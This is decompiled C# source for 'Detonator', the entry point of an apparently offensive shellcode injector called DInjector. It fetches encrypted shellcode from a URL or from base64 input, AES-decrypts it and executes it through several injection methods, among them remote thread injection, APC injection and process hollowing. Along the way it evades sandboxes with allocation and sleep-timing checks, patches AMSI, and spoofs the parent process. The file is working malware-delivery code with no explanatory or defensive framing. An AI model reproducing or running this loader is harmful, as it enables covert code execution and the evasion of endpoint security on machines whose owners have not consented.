// DInjector, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// DInjector.Detonator
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using DInjector;

internal class Detonator
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

	[DllImport("kernel32.dll")]
	private static extern void Sleep(uint dwMilliseconds);

	private static void Boom(string[] args)
	{
		if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 4096u, 12288u, 4u, 0u) == IntPtr.Zero)
		{
			return;
		}
		int num = new Random().Next(2000, 3000);
		double num2 = (double)((uint)num / 1000u) - 0.5;
		DateTime now = DateTime.Now;
		Sleep((uint)num);
		if (DateTime.Now.Subtract(now).TotalSeconds < num2)
		{
			return;
		}
		Dictionary<string, string> dictionary = ArgumentParser.Parse(args);
		try
		{
			if (bool.Parse(dictionary["/am51"]))
			{
				AM51.Patch();
			}
		}
		catch (Exception)
		{
		}
		string text = string.Empty;
		foreach (KeyValuePair<string, string> item in dictionary)
		{
			if (item.Value == string.Empty)
			{
				text = item.Key;
			}
		}
		string text2 = dictionary["/sc"];
		string password = dictionary["/password"];
		byte[] data;
		if (text2.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
		{
			Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
			WebClient webClient = new WebClient();
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			MemoryStream memoryStream = new MemoryStream(webClient.DownloadData(text2));
			data = new BinaryReader(memoryStream).ReadBytes(Convert.ToInt32(memoryStream.Length));
		}
		else
		{
			Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
			data = Convert.FromBase64String(text2);
		}
		byte[] array = new AES(password).Decrypt(data);
		int ppid = 0;
		try
		{
			ppid = int.Parse(dictionary["/ppid"]);
		}
		catch (Exception)
		{
		}
		bool blockDlls = false;
		try
		{
			if (bool.Parse(dictionary["/blockDlls"]))
			{
				blockDlls = true;
			}
		}
		catch (Exception)
		{
		}
		switch (text)
		{
		case "functionpointer":
			FunctionPointer.Execute(array);
			break;
		case "functionpointerv2":
			FunctionPointerV2.Execute(array);
			break;
		case "clipboardpointer":
			ClipboardPointer.Execute(array);
			break;
		case "currentthread":
			CurrentThread.Execute(array);
			break;
		case "currentthreaduuid":
			CurrentThreadUuid.Execute(Encoding.UTF8.GetString(array));
			break;
		case "remotethread":
			RemoteThread.Execute(array, int.Parse(dictionary["/pid"]));
			break;
		case "remotethreaddll":
			RemoteThreadDll.Execute(array, int.Parse(dictionary["/pid"]), dictionary["/dll"]);
			break;
		case "remotethreadview":
			RemoteThreadView.Execute(array, int.Parse(dictionary["/pid"]));
			break;
		case "remotethreadsuspended":
			RemoteThreadSuspended.Execute(array, int.Parse(dictionary["/pid"]));
			break;
		case "remotethreadapc":
			RemoteThreadAPC.Execute(array, dictionary["/image"], ppid, blockDlls);
			break;
		case "remotethreadcontext":
			RemoteThreadContext.Execute(array, dictionary["/image"], ppid, blockDlls);
			break;
		case "processhollow":
			ProcessHollow.Execute(array, dictionary["/image"], ppid, blockDlls);
			break;
		}
	}
}
